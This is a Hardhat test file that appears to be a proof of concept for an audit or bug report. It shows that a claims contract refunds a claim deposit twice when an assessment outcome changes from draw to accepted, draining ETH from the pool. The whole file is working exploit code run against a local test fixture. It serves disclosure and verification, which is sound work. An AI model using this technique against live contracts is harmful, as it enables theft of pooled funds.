// PoC: redeemClaimPayout refunds the assessment deposit a SECOND time
// when an assessment outcome transitions DRAW -> ACCEPTED, draining the Pool.

const { ethers, nexus } = require('hardhat');
const { expect } = require('chai');
const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');

const { setNextBlockBaseFee } = require('../../utils/evm');
const { createMockCover } = require('./helpers');
const { setup } = require('./setup');

const { AssessmentOutcome } = nexus.constants;

describe('PoC: double-refund of claim deposit (DRAW -> ACCEPTED)', function () {
  it('drains an extra CLAIM_DEPOSIT_IN_ETH from the Pool', async function () {
    const fixture = await loadFixture(setup);
    const { claims, cover, assessment, pool } = fixture.contracts;
    const { claimDepositInETH: deposit } = fixture.config;
    const [coverOwner] = fixture.accounts.members;

    // ---- 0. Set up a cover that the attacker owns. ----
    await createMockCover(cover, { owner: coverOwner.address });
    const coverId = 1;
    const claimId = await claims.getClaimsCount();
    const ipfsHash = ethers.solidityPackedKeccak256(['string'], ['poc-double-refund']);

    // Snapshot Pool ETH balance BEFORE any claim activity. This is the
    // baseline that the protocol must preserve modulo legitimate payouts.
    const poolBalanceInitial = await ethers.provider.getBalance(pool.target);

    // ---- 1. Submit claim. Attacker pays CLAIM_DEPOSIT_IN_ETH into the Pool. ----
    await setNextBlockBaseFee('0');
    await claims
      .connect(coverOwner)
      .submitClaim(coverId, ethers.parseEther('1'), ipfsHash, { value: deposit, gasPrice: 0 });

    expect(await ethers.provider.getBalance(pool.target)).to.equal(poolBalanceInitial + deposit);

    // ---- 2. Assessment finalizes as DRAW (acceptVotes == denyVotes after cooldown). ----
    await assessment.setAssessmentForOutcome(claimId, AssessmentOutcome.Draw);

    // ---- 3. Attacker retrieves deposit. depositRetrieved := true. ----
    const balBefore1stRefund = await ethers.provider.getBalance(coverOwner.address);
    await setNextBlockBaseFee('0');
    await claims.connect(coverOwner).retrieveDeposit(claimId, { gasPrice: 0 });
    const balAfter1stRefund = await ethers.provider.getBalance(coverOwner.address);

    expect(balAfter1stRefund - balBefore1stRefund).to.equal(deposit, '1st refund did not arrive');

    // Confirm the on-chain flag is set. This SHOULD prevent any further refunds.
    let storedClaim = await claims.getClaim(claimId);
    expect(storedClaim.depositRetrieved).to.equal(true);
    expect(storedClaim.payoutRedeemed).to.equal(false);

    // Pool is back to baseline — net flow so far is zero. Correct.
    expect(await ethers.provider.getBalance(pool.target)).to.equal(poolBalanceInitial);

    // ---- 4. Governance flips the outcome via undoVotes / extendVotingPeriod. ----
    // The mock helper simulates the resulting state where acceptVotes > denyVotes
    // and votingEnd + cooldown is in the past. This is the same on-chain
    // state that real Assessments.undoVotes(...) on a DENY-ballot ballot produces
    // when the original tally was 2:2.
    await assessment.setAssessmentForOutcome(claimId, AssessmentOutcome.Accepted);

    // ---- 5. Attacker calls redeemClaimPayout. ----
    // _isClaimRedeemable only checks !payoutRedeemed, so the call goes through
    // even though depositRetrieved == true. The Pool refunds the deposit AGAIN.
    const balBefore2ndRefund = await ethers.provider.getBalance(coverOwner.address);
    const coverOwnerEthBefore = balBefore2ndRefund;
    await setNextBlockBaseFee('0');

    await claims.connect(coverOwner).redeemClaimPayout(claimId, { gasPrice: 0 });

    const balAfter2ndRefund = await ethers.provider.getBalance(coverOwner.address);
    const coverOwnerEthAfter = balAfter2ndRefund;

    // Cover asset is ETH and claim amount = 1 ETH. The attacker should have
    // received exactly the cover payout (1 ETH). Instead they received
    // 1 ETH + an *unbacked* CLAIM_DEPOSIT_IN_ETH refund.
    const coverPayout = ethers.parseEther('1');
    const ethReceived = coverOwnerEthAfter - coverOwnerEthBefore;

    expect(ethReceived).to.equal(coverPayout + deposit, 'expected double refund did not occur');

    // ---- 6. Confirm Pool ETH is now below the legitimate baseline. ----
    // After step 3 the Pool was at `poolBalanceInitial`. After step 5 the Pool
    // legitimately owes the user `coverPayout` (1 ETH) — so its balance should
    // be exactly `poolBalanceInitial - coverPayout`. But the bug makes it lose
    // an extra `deposit`.
    const poolBalanceFinal = await ethers.provider.getBalance(pool.target);
    const expectedHonestPoolBalance = poolBalanceInitial - coverPayout;
    const actualLoss = expectedHonestPoolBalance - poolBalanceFinal;

    expect(actualLoss).to.equal(
      deposit,
      'Pool lost extra ETH beyond the legitimate cover payout — this is the stolen deposit',
    );

    // ---- 7. Internal state — payoutRedeemed and depositRetrieved both true. ----
    storedClaim = await claims.getClaim(claimId);
    expect(storedClaim.payoutRedeemed).to.equal(true);
    expect(storedClaim.depositRetrieved).to.equal(true);

    // ---- Summary ----
    // submitClaim:        Pool +0.05 ETH (deposit in)
    // retrieveDeposit:    Pool -0.05 ETH (refund #1)  -> net 0, depositRetrieved=true
    // redeemClaimPayout:  Pool -1.00 ETH cover payout (legitimate)
    //                     Pool -0.05 ETH refund #2 (unbacked) <-- THE BUG
    // Net stolen from Pool: 0.05 ETH per claim that follows this state path.
  });
});
